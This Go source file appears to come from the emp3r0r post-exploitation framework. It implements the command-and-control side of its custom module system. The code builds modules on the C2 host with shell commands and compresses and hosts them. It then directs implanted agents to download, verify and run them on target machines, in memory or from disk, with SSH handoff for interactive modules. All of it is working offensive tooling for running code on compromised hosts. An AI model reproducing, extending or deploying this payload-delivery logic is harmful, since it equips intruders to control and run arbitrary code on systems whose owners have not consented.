package modules

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"

	"github.com/google/uuid"
	"github.com/jm33-m0/arc/v2"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/internal/live"
	"github.com/jm33-m0/emp3r0r/core/lib/cli"
	"github.com/jm33-m0/emp3r0r/core/lib/crypto"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

// moduleCustom run a custom module
func moduleCustom() {
	if live.ActiveModule == nil {
		logging.Warningf("No module selected")
		return
	}
	config, exists := def.Modules[live.ActiveModule.Name]
	if !exists {
		logging.Errorf("Config of %s does not exist", live.ActiveModule)
		return
	}

	// build module on C2
	if config.Build != "" {
		logging.Printf("Building %s...", config.Name)
		out, err := build_module(config)
		if err != nil {
			logging.Errorf("Build module %s: %v", config.Name, err)
			return
		}
		logging.Printf("Module output:\n%s", out)
	}

	// if module is a plugin, no need to upload and execute files on target
	if config.IsLocal {
		logging.Printf("%s will run as a plugin on C2, no files will be executed on target", config.Name)
		return
	}

	// where to download the module, can be from C2 or other agents, see `listener`
	download_addr := getDownloadAddr()

	// agent side configs
	payload_type := config.AgentConfig.Type
	invocation, err := resolveInvocation(config, live.ActiveModule.Options)
	if err != nil {
		logging.Errorf("Parsing module invocation: %v", err)
		return
	}

	// interactive modules rely on echo handshake before SSH handoff
	if config.AgentConfig.IsInteractive {
		invocation.Argv = []string{"echo", crypto.SHA256SumRaw([]byte(def.MagicString))}
		invocation.Stdin = ""
		invocation.Coff = nil
	}

	invBytes, err := json.Marshal(invocation)
	if err != nil {
		logging.Errorf("Encoding invocation: %v", err)
		return
	}
	invB64 := base64.StdEncoding.EncodeToString(invBytes)

	// if in-memory module
	if config.AgentConfig.InMemory {
		handleInMemoryModule(*config, payload_type, invB64, download_addr)
		return
	}

	// other modules that need to be saved to disk
	handleCompressedModule(*config, payload_type, invB64, download_addr)
}

func build_module(config *def.ModuleConfig) (out []byte, err error) {
	err = os.Chdir(config.Path)
	if err != nil {
		return
	}
	defer os.Chdir(live.EmpWorkSpace)

	for _, opt := range live.ActiveModule.Options {
		if opt == nil {
			continue
		}
		// Environment variables need to be in uppercase
		os.Setenv(opt.Name, opt.Val)
	}

	// build module
	out, err = exec.Command("sh", "-c", config.Build).CombinedOutput()
	if err != nil {
		err = fmt.Errorf("%s (%v)", out, err)
		return
	}

	return
}

func getDownloadAddr() string {
	download_url_opt, ok := live.ActiveModule.Options["download_addr"]
	if ok {
		return download_url_opt.Val
	}
	return ""
}

func handleInMemoryModule(config def.ModuleConfig, payload_type, invocationB64, download_addr string) {
	hosted_file := live.WWWRoot + live.ActiveModule.Name + ".xz"
	logging.Infof("Compressing %s with xz...", live.ActiveModule.Name)

	// only one file is allowed
	if len(config.AgentConfig.Files) == 0 {
		logging.Errorf("No files found for module %s in %s", config.Name, config.Path)
		return
	}
	path := fmt.Sprintf("%s/%s", config.Path, config.AgentConfig.Files[0])
	data, err := os.ReadFile(path)
	if err != nil {
		logging.Errorf("Reading %s: %v", path, err)
		return
	}
	compressedBytes, err := arc.CompressXz(data)
	if err != nil {
		logging.Errorf("Compressing %s: %v", path, err)
		return
	}
	logging.Infof("Created %.4fMB archive (%s) for module '%s'", float64(len(compressedBytes))/1024/1024, hosted_file, live.ActiveModule.Name)
	err = os.WriteFile(hosted_file, compressedBytes, 0o600)
	if err != nil {
		logging.Errorf("Writing %s: %v", hosted_file, err)
		return
	}
	fileToDownload := filepath.Base(hosted_file)
	cmd := fmt.Sprintf("%s --mod_name %s --type %s --file_to_download %s --checksum %s --in_mem --invocation %s",
		def.C2CmdCustomModule, live.ActiveModule.Name, payload_type, fileToDownload, crypto.SHA256SumFile(hosted_file), strconv.Quote(invocationB64))
	if download_addr != "" {
		cmd += fmt.Sprintf(" --download_addr %s", strconv.Quote(download_addr))
	}
	cmd_id := uuid.NewString()
	logging.Debugf("Sending command %s to %s", cmd, live.ActiveAgent.Tag)
	err = CmdSender(cmd, cmd_id, live.ActiveAgent.Tag)
	if err != nil {
		logging.Errorf("Sending command %s to %s: %v", cmd, live.ActiveAgent.Tag, err)
	}
}

func handleCompressedModule(config def.ModuleConfig, payload_type, invocationB64, download_addr string) {
	tarball_path := live.WWWRoot + live.ActiveModule.Name + ".tar.xz"
	file_to_download := filepath.Base(tarball_path)
	if !util.IsFileExist(tarball_path) {
		logging.Infof("Compressing %s with tar.xz...", live.ActiveModule.Name)
		path := config.Path
		err := util.TarXZ(path, tarball_path)
		if err != nil {
			logging.Errorf("Compressing %s: %v", live.ActiveModule.Name, err)
			return
		}
		logging.Infof("Created %.4fMB archive (%s) for module '%s'",
			float64(util.FileSize(tarball_path))/1024/1024, tarball_path, live.ActiveModule.Name)
	} else {
		logging.Infof("Using cached %s", tarball_path)
	}

	checksum := crypto.SHA256SumFile(tarball_path)
	cmd := fmt.Sprintf("%s --mod_name %s --checksum %s --invocation %s --type %s --file_to_download %s",
		def.C2CmdCustomModule,
		live.ActiveModule.Name, checksum, strconv.Quote(invocationB64), payload_type, file_to_download)
	if download_addr != "" {
		cmd += fmt.Sprintf(" --download_addr %s", strconv.Quote(download_addr))
	}
	cmd_id := uuid.NewString()
	err := CmdSender(cmd, cmd_id, live.ActiveAgent.Tag)
	if err != nil {
		logging.Errorf("Sending command %s to %s: %v", cmd, live.ActiveAgent.Tag, err)
	}

	if config.AgentConfig.IsInteractive {
		handleInteractiveModule(config, cmd_id)
	}
}

func handleInteractiveModule(config def.ModuleConfig, cmd_id string) {
	opt, exists := config.Options["args"]
	if !exists {
		config.Options["args"] = &def.ModOption{
			Name: "args",
			Desc: "run this command with these arguments",
			Val:  "",
			Vals: []string{},
		}
	}
	args := opt.Val
	port := strconv.Itoa(util.RandInt(1024, 65535))
	look_for := crypto.SHA256SumRaw([]byte(def.MagicString))

	for i := 0; i < 10; i++ {
		if res, ok := live.CmdResults.Load(cmd_id); ok {
			if strings.Contains(res.(string), look_for) {
				break
			}
		}
		util.TakeABlink()
	}
	defer func() {
		live.CmdResults.Delete(cmd_id)
	}()

	sshErr := SSHClient(fmt.Sprintf("%s/%s",
		live.ActiveModule.Name, config.AgentConfig.Exec),
		args, port, false)
	if sshErr != nil {
		logging.Errorf("module %s: %v", config.Name, sshErr)
	}
}

// Print module meta data
func ModuleDetails(modName string) {
	config, exists := def.Modules[modName]
	if !exists {
		return
	}

	// build table using helper function
	header := []string{"Name", "Exec", "Platform", "Author", "Date", "Comment"}
	rows := [][]string{
		{config.Name, config.AgentConfig.Exec, config.Platform, config.Author, config.Date, config.Comment},
	}

	tableStr := cli.BuildTable(header, rows)
	cli.AdaptiveTable(tableStr)
	logging.Printf("Module details:\n%s", tableStr)
}

// scan custom modules in ModuleDir,
// and update ModuleHelpers, ModuleDocs
func InitModules() {
	if !util.IsExist(live.WWWRoot) {
		os.MkdirAll(live.WWWRoot, 0o700)
	}

	load_mod := func(mod_search_dir string) {
		// don't bother if module dir not found
		if !util.IsExist(mod_search_dir) {
			return
		}
		logging.Debugf("Scanning %s for modules", mod_search_dir)
		dirs, readdirErr := os.ReadDir(mod_search_dir)
		if readdirErr != nil {
			logging.Errorf("Failed to scan custom modules: %v", readdirErr)
			return
		}
		for _, dir := range dirs {
			if !dir.IsDir() {
				continue
			}
			config_file := fmt.Sprintf("%s/%s/config.json", mod_search_dir, dir.Name())
			if !util.IsExist(config_file) {
				continue
			}
			config, readConfigErr := readModCondig(config_file)
			if readConfigErr != nil {
				logging.Warningf("Reading config from %s: %v", dir.Name(), readConfigErr)
				continue
			}

			// module path, eg. ~/.emp3r0r/modules/foo
			config.Path = fmt.Sprintf("%s/%s", mod_search_dir, dir.Name())
			if config.IsLocal {
				mod_dir := filepath.Join(live.EmpWorkSpace, "modules", dir.Name())
				err := os.MkdirAll(mod_dir, 0o700)
				if err != nil {
					logging.Warningf("Failed to create %s: %v", mod_dir, err)
					continue
				}
				err = util.Copy(config.Path, mod_dir)
				if err != nil {
					logging.Warningf("Copying %s to %s: %v", config.Path, mod_dir, err)
					continue
				}
				config.Path = mod_dir
			}

			// add to module helpers
			ModuleRunners[config.Name] = moduleCustom

			// add module meta data
			def.Modules[config.Name] = config

			readConfigErr = updateModuleHelp(config)
			if readConfigErr != nil {
				logging.Warningf("Loading config from %s: %v", config.Name, readConfigErr)
				continue
			}
			def.Modules[config.Name] = config
			logging.Debugf("Loaded module %s", strconv.Quote(config.Name))
		}
	}

	// read from every defined module dir
	for _, mod_search_dir := range live.ModuleDirs {
		load_mod(mod_search_dir)
	}

	logging.Printf("Loaded %d modules", len(def.Modules))
}

// readModCondig read config.json of a module
func readModCondig(file string) (pconfig *def.ModuleConfig, err error) {
	type legacyOption struct {
		OptName string   `json:"opt_name"`
		OptDesc string   `json:"opt_desc"`
		OptVal  string   `json:"opt_val"`
		OptVals []string `json:"opt_vals"`
	}

	type optionJSON struct {
		Name     string   `json:"name"`
		Desc     string   `json:"description"`
		Val      string   `json:"default"`
		Vals     []string `json:"choices"`
		Type     string   `json:"type"`
		Required bool     `json:"required"`
		Pattern  string   `json:"pattern"`
		Encoding string   `json:"encoding"`
		Secret   bool     `json:"secret"`
		Min      *float64 `json:"min"`
		Max      *float64 `json:"max"`
	}

	type invocationArgJSON struct {
		Literal string      `json:"literal"`
		Flag    string      `json:"flag"`
		Param   string      `json:"param"`
		Value   interface{} `json:"value"`
	}

	type coffArgJSON struct {
		Param    string      `json:"param"`
		Literal  interface{} `json:"literal"`
		WireType string      `json:"wire_type"`
		Encoding string      `json:"encoding"`
	}

	type coffJSON struct {
		Export string        `json:"export"`
		Args   []coffArgJSON `json:"args"`
	}

	type invocationJSON struct {
		Argv           []invocationArgJSON `json:"argv"`
		StdinParam     string              `json:"stdin_param"`
		TimeoutSeconds int                 `json:"timeout_seconds"`
		Coff           *coffJSON           `json:"coff"`
	}

	type agentConfigJSON struct {
		Exec          string   `json:"exec"`
		Files         []string `json:"files"`
		InMemory      bool     `json:"in_memory"`
		Type          string   `json:"type"`
		IsInteractive bool     `json:"interactive"`
		WorkDir       string   `json:"work_dir"`
		NeedsRoot     bool     `json:"needs_root"`
	}

	type moduleConfigJSON struct {
		Name        string                  `json:"name"`
		Build       string                  `json:"build"`
		Author      string                  `json:"author"`
		Date        string                  `json:"date"`
		Comment     string                  `json:"comment"`
		IsLocal     bool                    `json:"is_local"`
		Platform    string                  `json:"platform"`
		Path        string                  `json:"path"`
		Fileless    bool                    `json:"fileless"`
		AgentConfig agentConfigJSON         `json:"agent_config"`
		Parameters  []optionJSON            `json:"parameters"`
		LegacyOpts  map[string]legacyOption `json:"options"`
		Invocation  invocationJSON          `json:"invocation"`
	}

	jsonData, err := os.ReadFile(file)
	if err != nil {
		return nil, fmt.Errorf("read %s: %v", file, err)
	}

	var raw moduleConfigJSON
	if err = json.Unmarshal(jsonData, &raw); err != nil {
		return nil, fmt.Errorf("failed to unmarshal JSON config: %v", err)
	}

	config := def.ModuleConfig{
		Name:     raw.Name,
		Build:    raw.Build,
		Author:   raw.Author,
		Date:     raw.Date,
		Comment:  raw.Comment,
		IsLocal:  raw.IsLocal,
		Platform: raw.Platform,
		Path:     raw.Path,
		Fileless: raw.Fileless,
		Options:  def.ModOptions{},
		AgentConfig: def.AgentModuleConfig{
			Exec:          raw.AgentConfig.Exec,
			Files:         raw.AgentConfig.Files,
			InMemory:      raw.AgentConfig.InMemory,
			Type:          raw.AgentConfig.Type,
			IsInteractive: raw.AgentConfig.IsInteractive,
			WorkDir:       raw.AgentConfig.WorkDir,
			NeedsRoot:     raw.AgentConfig.NeedsRoot,
		},
	}

	config.Invocation.TimeoutSeconds = raw.Invocation.TimeoutSeconds
	config.Invocation.StdinParam = raw.Invocation.StdinParam
	for _, arg := range raw.Invocation.Argv {
		config.Invocation.Argv = append(config.Invocation.Argv, def.InvocationArg{
			Literal: arg.Literal,
			Flag:    arg.Flag,
			Param:   arg.Param,
		})
	}
	if raw.Invocation.Coff != nil {
		coff := def.CoffInvocation{Export: raw.Invocation.Coff.Export}
		for _, arg := range raw.Invocation.Coff.Args {
			coff.Args = append(coff.Args, def.CoffArgSpec{
				Param:    arg.Param,
				Literal:  arg.Literal,
				WireType: arg.WireType,
				Encoding: arg.Encoding,
			})
		}
		config.Invocation.Coff = &coff
	}

	for _, p := range raw.Parameters {
		if p.Name == "" {
			continue
		}
		config.Options[p.Name] = &def.ModOption{
			Name:     p.Name,
			Desc:     p.Desc,
			Val:      p.Val,
			Vals:     p.Vals,
			Type:     p.Type,
			Required: p.Required,
			Pattern:  p.Pattern,
			Encoding: p.Encoding,
			Secret:   p.Secret,
			Min:      p.Min,
			Max:      p.Max,
		}
	}

	if len(config.Options) == 0 && len(raw.LegacyOpts) > 0 {
		for key, opt := range raw.LegacyOpts {
			config.Options[key] = &def.ModOption{
				Name: opt.OptName,
				Desc: opt.OptDesc,
				Val:  opt.OptVal,
				Vals: opt.OptVals,
				Type: "string",
			}
		}
	}

	pconfig = &config
	return
}

func updateModuleHelp(config *def.ModuleConfig) error {
	help_map := make(map[string]*def.ModOption)
	for opt, modOption := range config.Options {
		if modOption.Desc == "" {
			return fmt.Errorf("%s config error: %s incomplete", config.Name, opt)
		}
		help_map[opt] = modOption
		def.Modules[config.Name].Options = help_map
	}
	return nil
}

// resolveInvocation renders an invocation with concrete values from module options
func resolveInvocation(config *def.ModuleConfig, userOpts def.ModOptions) (def.ResolvedInvocation, error) {
	resolved := def.ResolvedInvocation{TimeoutSeconds: config.Invocation.TimeoutSeconds}

	lookupOpt := func(name string) (*def.ModOption, error) {
		if userOpts != nil {
			if opt, ok := userOpts[name]; ok && opt != nil {
				return opt, nil
			}
		}
		if config.Options != nil {
			if opt, ok := config.Options[name]; ok && opt != nil {
				return opt, nil
			}
		}
		return nil, fmt.Errorf("option %s not provided", name)
	}

	coerceVal := func(name string) (string, interface{}, error) {
		opt, err := lookupOpt(name)
		if err != nil {
			return "", nil, err
		}
		return renderOptionValue(opt)
	}

	for _, arg := range config.Invocation.Argv {
		switch {
		case arg.Literal != "":
			resolved.Argv = append(resolved.Argv, arg.Literal)
		case arg.Flag != "" && arg.Param != "":
			strVal, _, err := coerceVal(arg.Param)
			if err != nil {
				return resolved, err
			}
			if strVal == "" {
				continue
			}
			resolved.Argv = append(resolved.Argv, arg.Flag, strVal)
		case arg.Param != "":
			strVal, _, err := coerceVal(arg.Param)
			if err != nil {
				return resolved, err
			}
			if strVal == "" {
				continue
			}
			resolved.Argv = append(resolved.Argv, strVal)
		}
	}

	if config.Invocation.StdinParam != "" {
		stdinVal, _, err := coerceVal(config.Invocation.StdinParam)
		if err != nil {
			return resolved, err
		}
		resolved.Stdin = stdinVal
	}

	if config.Invocation.Coff != nil {
		coffInv := &def.ResolvedCoffInvocation{Export: config.Invocation.Coff.Export}
		for _, arg := range config.Invocation.Coff.Args {
			var (
				typed interface{}
				err   error
			)
			if arg.Param != "" {
				_, typed, err = coerceVal(arg.Param)
			} else {
				typed = arg.Literal
			}
			if err != nil {
				return resolved, err
			}
			coffInv.Args = append(coffInv.Args, def.ResolvedCoffArg{WireType: arg.WireType, Value: typed, Encoding: arg.Encoding})
		}
		resolved.Coff = coffInv
	}

	return resolved, nil
}

// renderOptionValue validates and returns both string and typed representations
func renderOptionValue(opt *def.ModOption) (string, interface{}, error) {
	val := strings.TrimSpace(opt.Val)
	if val == "" {
		if opt.Required {
			return "", nil, fmt.Errorf("option %s is required", opt.Name)
		}
		return "", "", nil
	}

	if len(opt.Vals) > 0 {
		found := false
		for _, v := range opt.Vals {
			if v == val {
				found = true
				break
			}
		}
		if !found {
			return "", nil, fmt.Errorf("option %s must be one of %v", opt.Name, opt.Vals)
		}
	}

	switch strings.ToLower(opt.Type) {
	case "bool":
		b, err := strconv.ParseBool(val)
		if err != nil {
			return "", nil, fmt.Errorf("option %s expects bool: %w", opt.Name, err)
		}
		return strconv.FormatBool(b), b, nil
	case "int":
		num, err := strconv.ParseInt(val, 10, 64)
		if err != nil {
			return "", nil, fmt.Errorf("option %s expects int: %w", opt.Name, err)
		}
		if opt.Min != nil && float64(num) < *opt.Min {
			return "", nil, fmt.Errorf("option %s below min", opt.Name)
		}
		if opt.Max != nil && float64(num) > *opt.Max {
			return "", nil, fmt.Errorf("option %s above max", opt.Name)
		}
		return fmt.Sprintf("%d", num), float64(num), nil
	case "uint", "port":
		num, err := strconv.ParseUint(val, 10, 64)
		if err != nil {
			return "", nil, fmt.Errorf("option %s expects uint: %w", opt.Name, err)
		}
		if opt.Min != nil && float64(num) < *opt.Min {
			return "", nil, fmt.Errorf("option %s below min", opt.Name)
		}
		if opt.Max != nil && float64(num) > *opt.Max {
			return "", nil, fmt.Errorf("option %s above max", opt.Name)
		}
		return fmt.Sprintf("%d", num), float64(num), nil
	default:
		return val, val, nil
	}
}
